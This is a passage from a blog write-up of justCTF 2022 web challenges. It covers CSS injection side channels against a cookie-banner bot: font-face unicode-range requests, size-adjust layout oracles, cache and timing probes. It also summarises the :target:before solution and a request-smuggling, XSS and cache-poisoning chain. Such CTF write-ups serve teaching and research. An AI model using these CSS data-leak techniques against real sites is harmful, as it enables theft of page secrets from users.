<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>First, let me talk about my thoughts after seeing this question. Because CSS injection can be done and the content is on the page, I naturally think of using <code>font-face</code> with <code>unicode-range</code>, like this:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">;</span>
  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://example.com<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+006A<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.nickname > span:nth-child(1)</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> A1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This way, as long as the first character of the flag is <code>U+006A</code>, the specified font will be applied, but the font is restricted by CSP and cannot be loaded, so this trick cannot pass.</p>
<p>Another trick I thought of is to use <code>size-adjust</code> with a local font:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">;</span>
  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token function">local</span><span class="token punctuation">(</span>Arial<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">size-adjust</span><span class="token punctuation">:</span> 1000%<span class="token punctuation">;</span>
  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+006A<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.nickname > span:nth-child(1)</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> A1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The screen will look like this:</p>
<p><img src="/img/justctf-2022-writeup/p2.png" alt="original UI"></p>
<p>My original idea was that if ninja cookie detects that the button appears on the screen before clicking it, I can use this trick to push the button off the screen so that ninja cookie won’t click it. Then, if the font doesn’t match, the button won’t be pushed away and will be clicked. Through this oracle, I can leak out the flag.</p>
<p>However, there are two problems. The first problem is that in the screenshot above, the enlarged font extends to the right and up, but cannot be pushed down to the content below. This is easily solved by changing the layout with CSS to make the layout horizontal:</p>
<p><img src="/img/justctf-2022-writeup/p3.png" alt="adjusted UI"></p>
<p>The second problem is the most fatal, which is that ninja cookie’s <code>:visible</code> means whether an element has width and height, and if so, it is visible. Therefore, it doesn’t matter whether it appears on the screen or not, so this trick is gg.</p>
<p>The second trick I thought of is cache probing, which can be written like this:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"A1"</span><span class="token punctuation">;</span>
  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/bootstrap.min.css?q=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+0041<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>If there is a match, the font will be loaded from <code>/static/bootstrap.min.css?q=1</code>. Although it won’t load successfully, the browser should cache it, and even if there is no cache, there is a 304 not modified mechanism, so the response should be faster than other things.</p>
<p>However, after testing, I found that the first problem is that the speed is not much different, and the second problem is that the bot uses the <code>disk-cache-size=1</code> flag, which is really thoughtful.</p>
<p>By the way, commonly used scroll bars and lazy loading images are also blocked.</p>
<p>The third trick I thought of is that we can do this:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"A1"</span><span class="token punctuation">;</span>
  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/bootstrap.min.css?q=1<span class="token punctuation">)</span></span><span class="token punctuation">,</span> 
    <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/bootstrap.min.css?q=2<span class="token punctuation">)</span></span><span class="token punctuation">,</span>
    ....
    <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/static/bootstrap.min.css?q=500<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+0041<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Because the bot’s code looks like this:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">:</span> r<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return document.readyState'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'complete'</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Assuming the font doesn’t match, the time to get the response when visiting the bot should be around 30 seconds. If there is a match, a bunch of requests will be sent to get the font, and the network will always have something, so it will take longer to meet the stop condition and get the response.</p>
<p>So the response time can tell if there is a match.</p>
<p>But this trick doesn’t work either because CSS can only have a maximum of 140 characters.</p>
<p>There are other tricks that I haven’t tried, such as combining <code>size-adjust</code> with animation mentioned earlier. If there is a match, keep switching fonts frantically, like this:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@keyframes</span> t</span> <span class="token punctuation">&#123;</span>
    <span class="token selector">0%</span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> A1<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
    <span class="token selector">50%</span> <span class="token punctuation">&#123;</span> <span class="token property">font-family</span><span class="token punctuation">:</span> rest<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"A1"</span><span class="token punctuation">;</span>
  <span class="token property">size-adjust</span><span class="token punctuation">:</span> 1000%<span class="token punctuation">;</span>
  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token function">local</span><span class="token punctuation">(</span>Arial<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+0041<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.nickname > span:nth-child(1)</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> A1<span class="token punctuation">;</span>
  <span class="token property">animation</span><span class="token punctuation">:</span> 0.01s t 0 infinite<span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>By constantly switching fonts, the width will keep changing, and the layout will have to be constantly rearranged, which should be more performance-intensive. As long as a way to detect this is found, it will be fine.</p>
<p>The first possibility is that the speed at which ninja cookie clicks will slow down, but I think the extension is handled by another thread, although I haven’t tested it. The second possibility is that the iframe stacks the website and its own exploit together, and then uses some JS to calculate this, but because this question blocks iframes, it is also impossible.</p>
<p>Anyway, this is just an idea, but there is still a long way to go to implement or succeed.</p>
<p>Below, I will talk about the official solution, which uses <code>:target</code> selector with <code>:before</code> to load the background image.</p>
<p>I know there is <code>::target-text</code> to match the highlighted part, but I’ve seen that only some properties can be used, and I don’t know that <code>:target</code> will match.</p>
<p>So the solution to this question is to use <code>:target:before</code> to load the image, and then use HTML injection + ninja cookie’s click to trigger the scroll.</p>
<p>The complete solution can be found here: <a target="_blank" rel="noopener" href="https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb">https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb</a></p>
<p>Related techniques can be found here: <a target="_blank" rel="noopener" href="https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/">New technique of stealing data using CSS and Scroll-to-Text Fragment feature.</a></p>
<h2><span id="dank-shark0-solves">Dank Shark(0 solves)</span></h2><p>I didn’t really look at this problem, so I don’t know what’s going on. Maybe I’ll come back and take a look later (although writing this probably means I won’t). </p>
<p>Here’s the solution discussed in the <a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978312189159030805/985647413832323153">discord</a> thread:</p>
<ol>
<li>Use 0day request smuggling in the js_challenge module.</li>
<li>Just write a short 64-length XSS in the nickname (iptables was not working on remote).</li>
<li>Use cache poisoning&#x2F;golang sync.pool buffer bug (if you close http connection without reading you have leak in next connection).</li>
</ol>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/07/09/en/google-ctf-2022-writeup/">GoogleCTF 2022 Notes</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/06/14/en/justctf-2022-xsleak-writeup/">justCTF 2022 - Baby XSLeak Write-up</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2023 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/06/14/justctf-2022-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>